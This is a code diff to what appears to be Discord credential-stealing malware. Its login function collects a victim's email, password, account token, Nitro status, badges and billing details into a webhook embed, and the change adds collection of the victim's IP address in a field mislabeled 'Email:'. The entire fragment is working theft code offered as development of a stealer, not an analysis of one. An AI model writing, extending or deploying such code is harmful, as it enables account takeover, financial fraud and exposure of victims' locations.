@@ -670,6 +670,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const ip = await getIp(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -690,6 +691,11 @@ const login = async (email, password, token) => {
           {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> Email:',
+            value: `\`${ip}\``,
             inline: true,
           },
           {
